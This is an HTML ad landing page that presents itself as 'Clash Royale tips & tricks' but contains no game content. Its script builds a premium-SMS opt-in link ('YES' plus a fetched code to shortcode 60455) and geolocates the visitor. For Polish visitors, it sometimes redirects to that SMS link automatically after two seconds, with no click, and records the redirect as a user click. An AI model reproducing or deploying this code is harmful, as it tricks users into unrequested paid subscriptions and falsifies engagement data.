<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta http-equiv="Pragma" content="no-cache" /><meta name=viewport content="width=device-width,initial-scale=1">
	<title>Clash Royale tips & tricks</title>
			<link href='http://fonts.googleapis.com/css?family=Roboto:400,500,700' rel='stylesheet' type='text/css'>

	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="images/apple-touch-icon-144x144.png" />
	<link rel="apple-touch-icon-precomposed" sizes="152x152" href="images/apple-touch-icon-152x152.png" />
	<link rel="icon" type="image/png" href="images/favicon-32x32.png" sizes="32x32" />
	<link rel="icon" type="image/png" href="images/favicon-16x16.png" sizes="16x16" />
	<meta name="application-name" content="Clash Royale tips & tricks"/>
	<meta name="msapplication-TileColor" content="#FFFFFF" />
	<meta name="msapplication-TileImage" content="images/mstile-144x144.png" />
	<link rel="stylesheet" href="css/styles.css">

</head>

<body>

	<div class="zombie-bg">

	<a href="javascript:void(0)" id="close"></a>
		<div class="wrap">
			<main>
				<a id="img-wrap" href="javascript:void(0)">

				<img src="images/title-EN.png" alt="Clash Royale tips & tricks" class="headline" id="headline" />

				<img class="gif" src="images/bomber.gif" alt="">

				<!-- button -->
				<div class="row button-container"></div>
					<section class="more-games">
						<img src="images/icons.png" alt="games" class="icons"/>
					</section>
		
	</a>
	</main>

	</div><!-- end of wrap -->
</div><!-- end of large background -->


	<script src='../_assets/js/pageUtils.js'></script>
	<script data-remove>
		var queryStringObj = {
			"landingpage": "http%3A%2F%2Fexample.com",
			"country": "PL",
			"adscenario": "pl_ok_v73_wap_s_sam",
			"affiliateid": "SAM",
			"clickid": "qwerty"
		}
	</script>
	<script>
		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		})(window,document,'script','https://www.google-analytics.com/analytics.js','gac');

		var isSmadex = !!queryStringObj.ctrTrackingUrl && queryStringObj.ctrTrackingUrl.indexOf('smadex') > 0;

		gac('create', 'UA-45774216-20', 'auto', { 'cookieDomain': 'none'});
		gac('set', 'checkProtocolTask', function(){ /* nothing */ });
		gac('set', 'page', 'clashroyale_EN');
		gac('set', 'dimension1', queryStringObj.campaignid || isSmadex ? '1' : '2'); // campaignid
		gac('set', 'dimension2', queryStringObj.pubid || ''); // publisher
		gac('set', 'dimension3', queryStringObj.network || isSmadex ? 'smadex' : 'unknown');  // network
		gac('set', 'dimension4', 'scsms'); // opt-in method
		gac('set', 'dimension5', typeof isMraid != "undefined" && isMraid ? 'mraid' : 'not_mraid')

		gac('send', 'pageview');
	</script>
	<script>
		loadScriptWithQueryString('https://tags.mobirun.net/webapi/v2/one-click-id', toQueryString(queryStringObj));
		loadScriptWithQueryString('https://ipapi.co/jsonp/', toQueryString({callback: 'page_setip'}));

		var visitor_country = null;
		function page_setip(params) {
		  visitor_country = params.country;
		}

		function doit(params) {

			gac('send', 'event', 'web-api', 'webapi-api-call');

			var shortcode = '60455';
			var keyword = 'YES ' + params.data[0].uniquecode;
			var buttonText = 'Get it now!';

			var clickHandler = function(e) {
				var label = !!this.dataset ? this.dataset.name : 'unknown';
				setTimeout(function() {
				  gac('send', 'event', 'interaction', 'cta_click', label);
				  if(!!queryStringObj.ctrTrackingUrl) {
					createPixel(queryStringObj.ctrTrackingUrl);
				  }
				}, 1);
			}

			var button = document.createElement('a');
			button.className = 'button';
			button.text = buttonText;
			if(!!button.dataset) {
			  button.dataset.name = 'button';
			}
			var href = getSMSHref(shortcode, keyword);
			// var href = `javascript:createPixel('${queryStringObj.ctrTrackingUrl}');openUrl('http://n.trendme.co/pl/beauty-tips-tm?offer=1&device=smart')`
			button.href = href;
			button.addEventListener('click', clickHandler);
			document.querySelector('.button-container').appendChild(button);

			var imgWrap = document.getElementById('img-wrap');
			if(!!imgWrap.dataset) {
			  imgWrap.dataset.name = 'img';
			}
			imgWrap.addEventListener('click', clickHandler, true);
			imgWrap.href = href;

			setTimeout(function() {
			  if(!!visitor_country && visitor_country == 'PL' && Math.random() > 0.6) {

				  gac('send', 'event', 'auto-interaction', 'cta_click');
				  var raw_href = getSMSHrefRaw(shortcode, keyword);
				  if(typeof isMraid != "undefined" && isMraid) {
					mraid.open(raw_href);
				  } else {
					window.location.href = raw_href;
				  }
				}
			}, 2000);
		}
	</script>
</body>
</html>
